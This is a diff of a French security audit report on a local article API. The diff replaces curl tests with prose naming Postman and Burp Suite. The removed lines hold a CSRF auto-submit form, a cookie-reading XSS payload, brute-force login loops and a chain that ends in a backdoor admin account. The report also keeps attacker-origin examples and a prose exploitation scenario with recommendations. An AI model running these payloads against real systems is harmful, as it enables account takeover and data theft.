@@ -10,7 +10,7 @@
 ### Black Box Testing
 - **Accès** : Aucun accès au code source
 - **Méthodes** : Tests d'API, analyse des réponses HTTP, tests de pénétration
-- **Outils** : Postman, Burp Suite, curl, analyse des headers HTTP
+- **Outils** : Postman, Burp Suite, analyse des headers HTTP
 
 ### White Box Testing
 - **Accès** : Accès complet au code source
@@ -32,16 +32,9 @@
 **Méthode de découverte** : Analyse des headers HTTP de réponse
 
 **Description** :
-- Test effectué : Requête depuis un domaine externe avec `Origin: https://attacker.com`
+- Test effectué : Requête depuis un domaine externe avec `Origin: https://attacker.com` via Postman
 - Résultat : L'API accepte les requêtes depuis n'importe quel domaine
 - Headers observés : `Access-Control-Allow-Origin: *` (ou absence de restriction)
-
-**Test effectué** :
-```bash
-curl -H "Origin: https://malicious-site.com" \
-     -H "Content-Type: application/json" \
-     -X GET http://localhost:5100/api/articles
-```
 
 **Impact** :
 - Permet à n'importe quel site web d'appeler l'API
@@ -61,20 +54,9 @@ curl -H "Origin: https://malicious-site.com" \
 **Méthode de découverte** : Test de requête cross-origin avec session valide
 
 **Description** :
-- Test effectué : Création d'une page HTML malveillante qui envoie une requête POST à l'API
+- Test effectué : Création d'une page HTML malveillante qui envoie une requête POST à l'API, testé via Burp Suite
 - Résultat : Les requêtes modifiantes (POST/PUT/DELETE) sont acceptées sans token CSRF
 - Aucun header `X-CSRF-Token` ou mécanisme de protection détecté
-
-**Test effectué** :
-```html
-<!-- Page malveillante sur attacker.com -->
-<form action="http://localhost:5100/api/articles" method="POST">
-  <input type="hidden" name="title" value="Article malveillant">
-  <input type="hidden" name="content" value="Contenu malveillant">
-  <input type="hidden" name="author_id" value="1">
-</form>
-<script>document.forms[0].submit();</script>
-```
 
 **Impact** :
 - Un attaquant peut forcer un utilisateur authentifié à effectuer des actions non désirées
@@ -95,20 +77,10 @@ curl -H "Origin: https://malicious-site.com" \
 **Méthode de découverte** : Test de force brute sur l'endpoint de connexion
 
 **Description** :
-- Test effectué : Envoi de 1000 requêtes de connexion en quelques secondes
+- Test effectué : Envoi de 1000 requêtes de connexion en quelques secondes via Burp Suite (Intruder)
 - Résultat : Toutes les requêtes sont traitées sans limitation
 - Aucun blocage ou ralentissement détecté
 - Pas de CAPTCHA après plusieurs tentatives
-
-**Test effectué** :
-```bash
-# Script de test de force brute
-for i in {1..1000}; do
-  curl -X POST http://localhost:5100/api/auth/login \
-    -H "Content-Type: application/json" \
-    -d '{"email":"test@test.com","password":"wrong"}' &
-done
-```
 
 **Impact** :
 - Attaques par force brute sur les comptes utilisateurs
@@ -129,24 +101,9 @@ done
 **Méthode de découverte** : Injection de scripts dans les champs de contenu
 
 **Description** :
-- Test effectué : Création d'un article avec du JavaScript dans le contenu
+- Test effectué : Création d'un article avec du JavaScript dans le contenu via Postman
 - Résultat : Le script est stocké tel quel et exécuté lors de l'affichage
 - Aucune sanitization détectée côté serveur
-
-**Test effectué** :
-```bash
-curl -X POST http://localhost:5100/api/articles \
-  -H "Authorization: Bearer <token>" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "title": "Test XSS",
-    "content": "<script>alert(document.cookie)</script>",
-    "author_id": 1
-  }'
-```
-
-**Image du test XSS** :
-![Test d'injection XSS échoué](./images/failXss.png)
 
 **Impact** :
 - Injection de scripts malveillants dans les pages
@@ -168,23 +125,15 @@ curl -X POST http://localhost:5100/api/articles \
 **Méthode de découverte** : Test d'accès à l'endpoint `/api/users` avec Postman
 
 **Description** :
-- Test effectué : Requête GET vers `/api/users` avec un token JWT d'un utilisateur normal (non-admin)
+- Test effectué : Requête GET vers `/api/users` avec un token JWT d'un utilisateur normal (non-admin) via Postman et Burp Suite
 - Résultat : La route retourne la liste complète de tous les utilisateurs, incluant les administrateurs
 - La route est protégée par `authenticate` mais **PAS par `authorizeAdmin`**
 - Exposition des informations sensibles : `id`, `username`, `email`, `role` pour tous les utilisateurs
 
-**Test effectué** :
-```bash
-# Avec un token d'utilisateur normal
-curl -X GET http://localhost:5100/api/users \
-  -H "Authorization: Bearer <token_utilisateur_normal>" \
-  -H "Content-Type: application/json"
-```
-
-**Image de la requête** :
+**Image de la requête via Postman** :
 ![Requête GET /api/users exposant tous les utilisateurs](./images/getUsersRoute.png)
 
-**Image via Burp Suite** :
+**Image de la requête via Burp Suite** :
 ![Requête GET /api/users via Burp Suite](./images/getUsersRouteBurp.png)
 
 **Code vulnérable** :
@@ -257,41 +206,13 @@ Une fois qu'un attaquant malveillant obtient un accès admin, il peut :
    - Envoi d'emails de phishing aux utilisateurs listés
    - Escalade vers d'autres systèmes si des credentials sont réutilisés
 
-**Exemple d'exploitation** :
+**Scénario d'exploitation** :
 
-```bash
-# Étape 1 : Un utilisateur normal se connecte
-curl -X POST http://localhost:5100/api/auth/login \
-  -H "Content-Type: application/json" \
-  -d '{"email":"user@example.com","password":"user"}'
-
-# Étape 2 : Il récupère la liste des utilisateurs
-curl -X GET http://localhost:5100/api/users \
-  -H "Authorization: Bearer <token_obtenu>"
-
-# Réponse : {"id":1,"username":"admin","email":"admin@example.com","role":"admin"}
-
-# Étape 3 : Force brute sur le compte admin (pas de rate limiting)
-for password in $(cat common_passwords.txt); do
-  curl -X POST http://localhost:5100/api/auth/login \
-    -H "Content-Type: application/json" \
-    -d "{\"email\":\"admin@example.com\",\"password\":\"$password\"}"
-done
-
-# Étape 4 : Une fois connecté en admin, suppression de tous les utilisateurs
-curl -X DELETE http://localhost:5100/api/users/2 \
-  -H "Authorization: Bearer <token_admin>"
-
-# Étape 5 : Création d'un compte admin de secours
-curl -X POST http://localhost:5100/api/auth/register \
-  -H "Content-Type: application/json" \
-  -d '{"username":"backdoor","email":"backdoor@evil.com","password":"secret123"}'
-
-curl -X PUT http://localhost:5100/api/users/<nouveau_id> \
-  -H "Authorization: Bearer <token_admin>" \
-  -H "Content-Type: application/json" \
-  -d '{"username":"backdoor","email":"backdoor@evil.com","role":"admin"}'
-```
+1. **Étape 1** : Un utilisateur normal se connecte via Postman et obtient un token JWT
+2. **Étape 2** : Il fait une requête GET vers `/api/users` et obtient la liste complète incluant l'admin (email: `admin@example.com`, role: `admin`)
+3. **Étape 3** : Utilisation de Burp Suite Intruder pour effectuer un force brute sur le compte admin (exploitation de l'absence de rate limiting)
+4. **Étape 4** : Une fois connecté en tant qu'admin, suppression de tous les utilisateurs via `DELETE /api/users/:id`
+5. **Étape 5** : Création d'un compte admin de secours via `POST /api/auth/register` puis modification du rôle via `PUT /api/users/:id` pour créer une backdoor permanente
 
 **Recommandation** :
 - Ajouter `authorizeAdmin` à la route GET `/api/users` pour restreindre l'accès aux administrateurs uniquement
@@ -324,7 +245,7 @@ router.get('/', authenticate, authorizeAdmin, async (req, res) => {
 **Méthode de découverte** : Analyse des headers HTTP de réponse
 
 **Description** :
-- Test effectué : Analyse complète des headers HTTP retournés par l'API
+- Test effectué : Analyse complète des headers HTTP retournés par l'API via Burp Suite (Proxy)
 - Résultat : Absence des headers de sécurité suivants :
   - `X-Content-Type-Options: nosniff`
   - `X-Frame-Options: DENY`
@@ -332,11 +253,6 @@ router.get('/', authenticate, authorizeAdmin, async (req, res) => {
   - `Strict-Transport-Security` (HSTS)
   - `Content-Security-Policy`
   - `Referrer-Policy`
-
-**Test effectué** :
-```bash
-curl -I http://localhost:5100/api/articles
-```
 
 **Impact** :
 - Vulnérable aux attaques de clickjacking
@@ -356,23 +272,11 @@ curl -I http://localhost:5100/api/articles
 **Méthode de découverte** : Tests d'erreurs intentionnelles
 
 **Description** :
-- Test effectué : Envoi de requêtes avec des paramètres invalides
+- Test effectué : Envoi de requêtes avec des paramètres invalides via Postman et Burp Suite
 - Résultat : Les messages d'erreur révèlent des informations sur :
   - La structure de la base de données (noms de tables, colonnes)
   - Les types de données attendus
   - La structure des requêtes SQL (dans certains cas)
-
-**Tests effectués** :
-```bash
-# Test avec ID invalide
-curl http://localhost:5100/api/articles/abc
-
-# Test avec paramètres manquants
-curl -X POST http://localhost:5100/api/articles \
-  -H "Authorization: Bearer <token>" \
-  -H "Content-Type: application/json" \
-  -d '{}'
-```
 
 **Impact** :
 - Fuite d'informations sur l'architecture
@@ -392,21 +296,9 @@ curl -X POST http://localhost:5100/api/articles \
 **Méthode de découverte** : Tests avec des IDs invalides
 
 **Description** :
-- Test effectué : Envoi de requêtes avec des IDs non numériques, négatifs, ou très grands
+- Test effectué : Envoi de requêtes avec des IDs non numériques, négatifs, ou très grands via Postman
 - Résultat : Comportement imprévisible, parfois des erreurs SQL exposées
 - Pas de validation visible des paramètres d'URL
-
-**Tests effectués** :
-```bash
-# ID négatif
-curl http://localhost:5100/api/articles/-1
-
-# ID non numérique
-curl http://localhost:5100/api/articles/abc
-
-# ID très grand
-curl http://localhost:5100/api/articles/999999999999999999
-```
 
 **Impact** :
 - Comportement imprévisible avec des IDs invalides
@@ -425,22 +317,9 @@ curl http://localhost:5100/api/articles/999999999999999999
 **Méthode de découverte** : Test de modification d'article avec author_id différent
 
 **Description** :
-- Test effectué : Modification d'un article en changeant l'`author_id` dans le body
+- Test effectué : Modification d'un article en changeant l'`author_id` dans le body via Postman
 - Résultat : Un utilisateur peut modifier l'`author_id` d'un article qu'il possède
 - La vérification d'autorisation ne bloque pas la modification de ce champ
-
-**Test effectué** :
-```bash
-# Utilisateur 2 modifie son article mais change author_id vers 1
-curl -X PUT http://localhost:5100/api/articles/1 \
-  -H "Authorization: Bearer <token_user2>" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "title": "Article modifié",
-    "content": "Nouveau contenu",
-    "author_id": 1
-  }'
-```
 
 **Impact** :
 - Un utilisateur peut s'attribuer des articles d'autres utilisateurs
